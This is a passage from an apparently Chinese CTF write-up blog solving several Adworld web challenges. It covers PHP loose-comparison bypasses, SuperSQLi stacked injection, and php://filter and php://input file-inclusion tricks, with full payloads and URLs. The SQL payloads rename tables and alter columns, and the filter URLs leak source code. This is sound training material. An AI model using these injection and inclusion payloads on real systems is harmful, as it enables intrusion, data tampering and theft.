class="hljs-variable">$val</span>===<span class="hljs-string">"DGGJ"</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no......"</span>):<span class="hljs-literal">NULL</span>;<br>        }<br>        <span class="hljs-variable">$key2</span> = <span class="hljs-number">1</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no hack"</span>);<br>    }<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> &amp;&amp; <span class="hljs-variable">$key2</span>){<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">"Hgfks.php"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"You're right"</span>.<span class="hljs-string">"\n"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>}<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP substr函数：substr(<em>string,start,length</em>)</p><p>start：规定何处开始，<strong>可以是负数</strong>，表明在从<strong>字符串结尾</strong>的指定位置开始，-2表示从倒数第二个开始。</p></li><li><p>==<strong>PHP 中字符串与数值比较的陷阱</strong>==：</p><ul><li>当两个字符比较时，就是比较他们的ASCII码</li><li>两个字符串进行比较时，是从第一位开始比较其ASCII码，只要有一位出现了 差异，就返回比较结果。</li><li>当字符串与数字比较时，<strong>首先系统尝试将此字符串/字符转换为整型/浮点型</strong>，然后进行比较，如**’12bsd’转型为12<strong>，</strong>‘a’转型为0<strong>，千万需要注意的是此时不是将其对应的ASCII码值与数字进行大小比较了。其实同样的道理，’a’+10结果也是10。并且容易忽略的：</strong>0 与任意不可转化为数字的字符串比较(操作符为双等时。即松散比较), 均返回 true。**</li></ul></li></ul><h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>​        直接看到代码尾部有一个Hgfks.php，试着直接访问，发现不行，又访问Hgfks.phps，也不行，好吧，阅读前面的代码。首先从地址栏读取了a,b两个参数，第一个函数是if判断是检验a,b的值是否符合要求，首先对a，有个<strong>intval函数</strong>，将任意类型转为int型，然后这个值要大于6000000，且a的长度不超过3个字符。那么可以用9e9这种方式传入。再看b，<strong>是要b的MD5码的最后6位等于给定输入，尝试用bp爆破，也可以写python脚本碰撞</strong>。得到53724为b的值。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp4.jpg" class=""><p>继续阅读代码，发现有c作为值，试着绕过c，首先有一个json_decode(@$_GET[‘c’])，说明要c是post，json格式的数据，提交形式c={}，首先有一个m，m&gt;2022&amp;&amp;m不是数字，那么我们想到PHP中的松散比较，m不是数字，那么必然是字符串，<strong>字符串于数值比较时，如果包含数字，则尝试先转为只保留数字，如果不包含数字，则转为0，</strong>所以我们这里会有c={“m”:20222a}，m已经通过，向下走，发现c中还有一个变量n，首先n是一个数组，然后count()=2，说明其有两个元素。</p><p>那么修改c的形式c={“m”:”20222a”,”n”:[]}，可以发现出现了no hack字样，说明我们已经绕过了m的验证，然后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>][<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><p>说明n的第一个元素要为数组，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">"DGGJ"</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]);<br><span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no..."</span>):<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>){<br>    <span class="hljs-variable">$val</span>===<span class="hljs-string">"DGGJ"</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no......"</span>):<span class="hljs-literal">NULL</span>;<br>}<br></code></pre></td></tr></table></figure><p><strong>这里是说明n中要包含DGGJ，又不能包含DGGJ，很神奇，这里要解决的话，我们应该想到PHP中比较常见的比较陷阱，array_search的本质是将需要查找的字符串与数组内的元素进行比较，所以我们写0的话是不是就可以绕过这个查询了呢（0在比较中的特殊性），我们可以这样写了c={“m”:”22222a”,”m”:[[0,1],0]}，然后try一下，答案来了。</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp5.jpg" class=""><h4 id="3-SuperSQLi"><a href="#3-SuperSQLi" class="headerlink" title="3_SuperSQLi"></a>3_SuperSQLi</h4><h5 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h5><p>进入环境后出现一个查询框，如下图</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp6.jpg" class=""><p>题目已经告诉了这是一道sql注入题，所以直接使用sql注入解题。</p><h5 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>==堆叠注入==<strong>：Stacked injections(堆叠注入)从名词的含义就可以看到应该是</strong>一堆 sql 语句(多条)一起执行</strong>。在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句。因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间在于<strong>union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</strong>但是堆叠查询并不是每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>一般的拼接形式为: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">';show .....</span><br><span class="hljs-string">=1'</span>;<span class="hljs-keyword">drop</span> .....<br><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">';rename ...</span><br></code></pre></td></tr></table></figure></li><li><p><strong>SQL的一些表相关的DDL语句知识：</strong></p><ul><li><pre><code class="sql">show tables; #打印当前所有表<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```sql<br>  show columns from `tablename`;#展示指定表的所有字段<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="sql">alter table `ss` rename to `S`;-- 修改表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-operator">-</span> ```<span class="hljs-keyword">sql</span><br>  <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `S` change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">-- 修改表中字段名和字段类型  </span><br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><p>首先，使用常用的SQL注入测试，注入’or 1=1，出现了新的回显，就是输入不同的id返回的值，并且只有1，2，114514有不同的返回值，但好像暂时并没有什么用。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp8.jpg" class=""><p>然后使用union联查，**’union select * from supersqli;当然是测试题目名构成的表啦，说不定就中了呢。**当然这里没中，回显表明后端进行了一定的过滤。像select、update都被ban掉了，但是show没有被ban掉，可以尝试打印。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp9.jpg" class=""><p><strong>我们show一下databases，发现出现了回显，显示了当前DBMS中管理的数据库</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp10.jpg" class=""><p>发现了supersqli，合理推测这是题目使用的数据库，我们继续查看一下包含的表，<strong>show tables</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp11.jpg" class=""><p>发现当前使用的有两张表，1919810931114514和words，show columns from打印两张表的字段看看。</p><p>words表里的内容如下图，<strong>包含id和data，非常有可能是题目查询使用的表，因为我们输入的是id的值，返回给我们data的内容</strong></p><p>使用的注入语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">';show columns from `word`</span><br><span class="hljs-string">--注意字符串作为表名使用时应该带有反引号`</span><br></code></pre></td></tr></table></figure><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp12.jpg" class=""><p><strong>1919810931114514表里的内容，包含flag，这应该就是我们需要的东西了，问题现在转到了如何让题目查询1919…这张表。</strong></p><p>使用的注入语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">';show columns from `1919810931114514`;</span><br></code></pre></td></tr></table></figure><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp13.jpg" class=""><p><strong>我们这里采用修改表名的方式修改查询对象，</strong></p><p><strong>1’;alter table words rename to word;</strong></p><p><strong>没有报错，我们再次查询一下发现，已经找不到原来的表了，也验证了前面猜测这是题目所用的那张表。</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp15.jpg" class=""><p>**==但是这里出现了一个问题，当我们像修改另一张表的名字时，同样也会报错，为什么呢，因为现在已经找不到words表了，id字段不能被注入了，所以我们应该同时修改两张表，而且同时要修改新的words表的flag字段为id==**，也就是这样写：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">';alter table `words` rename to `word`;alter table `1919810931114514` rename to `words`;alter table words change flag id varchar(100);</span><br></code></pre></td></tr></table></figure><p>那么我们再用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">'or 1=1;</span><br></code></pre></td></tr></table></figure><p>即可得到答案。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp16.jpg" class=""><h4 id="4-CTF-fileinclude-1"><a href="#4-CTF-fileinclude-1" class="headerlink" title="4_CTF_fileinclude_1"></a>4_CTF_fileinclude_1</h4><h5 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h5><p>进入环境直接一段PHP代码，且是文件上传相关，先去学习一下PHP文件上传相关知识。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">WRONG WAY! <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>]))<br>{<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>];<br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file1</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file2</span>))<br>    {<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file2</span>) === <span class="hljs-string">"hello ctf"</span>)<br>        {<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file1</span>);<br>        }<br>    }<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"NONONO"</span>);<br>}<br></code></pre></td></tr></table></figure><h5 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>**==PHP伪协议==**：参考文章<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><ul><li><p><strong>php://协议</strong>，访问各个IO流，CTF中常用php://filter（用于读取源码）和php://input（执行php代码）</p></li><li><p><strong>php://filer，</strong>(&gt;=5.0.0)一种元封装器，设计<strong>用于数据流打开时的筛选过滤</strong>应用。对于一体式<code>（all-in-one）</code>的<strong>文件函数非常有用</strong>，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</p><ul><li>resource参数：传入要过滤的数据流</li><li>read参数：可选，可以设定多个过滤器名称</li><li>write参数：可选，可以设定多个过滤器名称</li><li>一个样例：test=php://filter/read=convert.base64-encode/resource=info.php</li></ul></li><li><p><strong>php://input</strong>，假如我们post了一个data，则使用input可以读取这个data，所以在url请求头中可以使用input进行传参。同时，可以post一段php代码，让input去执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">..../?id=1&amp;&amp;name=php://input<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>PHP include/require函数：</strong>如果 include/require 出现于调用文件中的一个函数里，则<strong>被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样</strong>。所以它将遵循该函数的变量范围。此规则的一个例外是魔术常量，它们是在发生包含之前就已被解析器处理的。include在所包含文件找不到时会继续执行之后的代码，而require会报错。</p></li><li><p><strong>Base64编码流程：base64常以=号结尾</strong></p><ul><li>1.将所有字符转为8位二进制的ASCII码</li><li>2.将8位二进制3个归为一组，共计24位，再拆分为4组，每组6位（<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="7.398ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 3270.1 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,363) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g><g data-mml-node="mo" transform="translate(1214.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2270.1,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container>）</li><li>3.将获得的6位二进制转为10进制</li><li>4.从Base64编码表获取对应的编码</li><li><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_1.jpg" class=""></li></ul></li><li><p><strong>对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“=”替代，因此，“ABCD”的base64编码为：“QUJDRA==”。</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_2.jpg" class=""></li></ul><h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><p>代码有一句include(“flag.php”)，引入了一个文件，我们合理地猜测flag是包含在flag.php中的，所以我们先访问一下flag.php，发现只打印了一句，并没有flag，说明flag可能在文件的注释里。然后有两个参数，说明我们需要在url中传入file1和file2两个参数。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_5.jpg" class=""><p>于是我们合理地想到可以使用文件过滤，将flag.php中地源码提取出来，原因是在第二层的if语句中有</p><p><code>include($file1);</code>，于是我们的url中file1可以这样编写：<code>file1=php://filter/read=convert.base64-encode/resource=flag.php</code>；然后考虑file2，我们先使用hackbar尝试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=hello ctf<br></code></pre></td></tr></table></figure><p>发现报错，因为<strong>有个file_get_contents函数，file2输入得是个文件才行</strong>，但是现在我们没有其他的文件可以输入。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_6.jpg" class=""><p>在hackbar里提交如下url，且在post中提交hello ctf，这里hackbar提交不了，选择使用BP提交，先在hackbar里execute，然后再BP里抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=php://input<br></code></pre></td></tr></table></figure><p>如下，<strong>注意修改content-length</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_3.jpg" class=""><p>得到一个base64编码，然后去解码即可</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_4.jpg" class=""><h4 id="5-file-include-江苏工匠杯（-字符编码问题未懂）"><a href="#5-file-include-江苏工匠杯（-字符编码问题未懂）" class="headerlink" title="5_file_include 江苏工匠杯（?字符编码问题未懂）"></a>5_file_include 江苏工匠杯（?字符编码问题未懂）</h4><h5 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h5><p>进入环境，看到一段PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">"./check.php"</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h5><ul><li><strong>PHP——iconv函数</strong></li><li>一些常见的字符编码</li></ul><h5 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h5><p>很明显的是文件包含问题，读代码我们可以发现是要在url中输入一个filename变量。</p><p>首先尝试了一下伪协议，<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p><p>结果出现了，但是只有一句话。resource改成其他都是相同的回显。说明很可能被过滤，但具体过滤了哪些东西还不清楚</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/file_include_jiangsugongjiangbei_1.jpg" class=""><p>可以使用<code>convert.iconv.</code>，进行过滤，可以使用convert.iconv.utf8.utf16/resource=check.php</p><h4 id="6-fileinclude-宜兴网信办"><a href="#6-fileinclude-宜兴网信办" class="headerlink" title="6_fileinclude 宜兴网信办"></a>6_fileinclude 宜兴网信办</h4><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_1.jpg" class=""><p>文件包含题。</p><h5 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>cookie</strong>：</p></li><li><p>BP中cookie的写法</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">cookie</span><span class="hljs-punctuation">: </span>language=flag<br></code></pre></td></tr></table></figure></li></ul><h5 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h5><p>首先检查下网页源代码，发现出现了index.php的源码。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;/head&gt;<br><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: language in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;<br>Please choose the language you want : English or Chinese<br>&lt;h1&gt;Hi,EveryOne,The flag is in flag.php&lt;/h1&gt;&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;/head&gt;<br><br>&lt;?php<br>if( !ini_get('display_errors') ) {<br>  ini_set('display_errors', 'On');<br>  }<br>error_reporting(E_ALL);<br>$lan = $_COOKIE['language'];<br>if(!$lan)<br>{<br>@setcookie("language","english");<br>@include("english.php");<br>}<br>else<br>{<br>@include($lan.".php");<br>}<br>$x=file_get_contents('index.php');<br>echo $x;<br>?&gt;<br>&lt;/html&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>发现是要我们传入一个cookie，其name为language，题目告诉我们答案在flag.php里，那么我们就去那里看看。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_2.jpg" class=""><p>设置一下cookie，加上过滤，所以我们这样写</p><p><code>language=php://filter/read=convert.base64-encode/resource=flag</code></p><p>发现直接给出了一段base64编码后的字符串，去转换一下，得出答案。</p><h4 id="7-easy-upload-CTF"><a href="#7-easy-upload-CTF" class="headerlink" title="7_easy_upload_CTF"></a>7_easy_upload_CTF</h4><h5 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h5><p>进入环境，就是一个文件上传的提交</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_1.jpg" class=""><p>检查一下网页源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.round_icon</span>{</span><br><span class="language-css">  <span class="hljs-attribute">width</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">height</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: flex;</span><br><span class="language-css">  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><br><span class="language-css">  <span class="hljs-attribute">align-items</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">justify-content</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">overflow</span>: hidden;</span><br><span class="language-css">  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">}</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>easyupload<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 